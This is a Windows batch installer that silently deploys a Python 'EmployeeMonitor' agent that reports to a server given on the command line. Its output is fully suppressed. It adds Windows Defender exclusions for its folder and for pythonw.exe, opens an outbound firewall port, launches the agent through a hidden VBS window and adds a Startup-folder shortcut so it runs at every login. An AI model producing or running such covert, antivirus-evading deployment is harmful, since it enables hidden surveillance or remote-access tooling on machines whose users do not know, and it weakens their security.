@echo off
:: FULLY SILENT INSTALLER - No output, no windows
:: For remote/scripted deployment
:: Must run as Administrator
::
:: Usage: install_silent.bat SERVER_NAME_OR_IP
:: Example: install_silent.bat ADMIN-PC
:: Example: install_silent.bat 192.168.1.100

net session >nul 2>&1
if %errorLevel% neq 0 exit /b 1

:: Get server from command line argument
if "%~1"=="" exit /b 1
set "SERVER_IP=%~1"
set "SERVER_PORT=3847"
set "INSTALL_DIR=C:\Program Files\EmployeeMonitor"
set "AGENT_NAME=EmployeeMonitor"
set "SOURCE_DIR=%~dp0"

:: Check Python
python --version >nul 2>&1
if %errorLevel% neq 0 exit /b 1

:: Kill existing
taskkill /F /IM pythonw.exe >nul 2>&1
timeout /t 1 /nobreak >nul

:: Create dir
if exist "%INSTALL_DIR%" rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
mkdir "%INSTALL_DIR%" >nul 2>&1

:: Copy files
xcopy "%SOURCE_DIR%*.py" "%INSTALL_DIR%\" /Y /Q >nul 2>&1
xcopy "%SOURCE_DIR%*.txt" "%INSTALL_DIR%\" /Y /Q >nul 2>&1
xcopy "%SOURCE_DIR%monitors\*" "%INSTALL_DIR%\monitors\" /E /I /Y /Q >nul 2>&1
xcopy "%SOURCE_DIR%utils\*" "%INSTALL_DIR%\utils\" /E /I /Y /Q >nul 2>&1

:: Install deps
cd /d "%INSTALL_DIR%"
pip install -r requirements.txt -q >nul 2>&1

:: Config
powershell -Command "(Get-Content '%INSTALL_DIR%\config.py') -replace 'SERVER_HOST = \".*\"', 'SERVER_HOST = \"%SERVER_IP%\"' | Set-Content '%INSTALL_DIR%\config.py'" >nul 2>&1
powershell -Command "(Get-Content '%INSTALL_DIR%\config.py') -replace 'SERVER_PORT = \d+', 'SERVER_PORT = %SERVER_PORT%' | Set-Content '%INSTALL_DIR%\config.py'" >nul 2>&1

:: Defender
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe' -ErrorAction SilentlyContinue" >nul 2>&1

:: Firewall
netsh advfirewall firewall delete rule name="%AGENT_NAME%" >nul 2>&1
netsh advfirewall firewall add rule name="%AGENT_NAME%" dir=out action=allow protocol=tcp remoteport=%SERVER_PORT% >nul 2>&1

:: Silent launcher
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.CurrentDirectory = "%INSTALL_DIR%"
echo WshShell.Run "pythonw main.py --server %SERVER_IP% --port %SERVER_PORT%", 0, False
) > "%INSTALL_DIR%\start_silent.vbs"

:: Auto-start
powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%AGENT_NAME%.lnk'); $s.TargetPath = '%INSTALL_DIR%\start_silent.vbs'; $s.WorkingDirectory = '%INSTALL_DIR%'; $s.WindowStyle = 7; $s.Save()" >nul 2>&1

:: Start now
cscript //nologo "%INSTALL_DIR%\start_silent.vbs" >nul 2>&1

exit /b 0
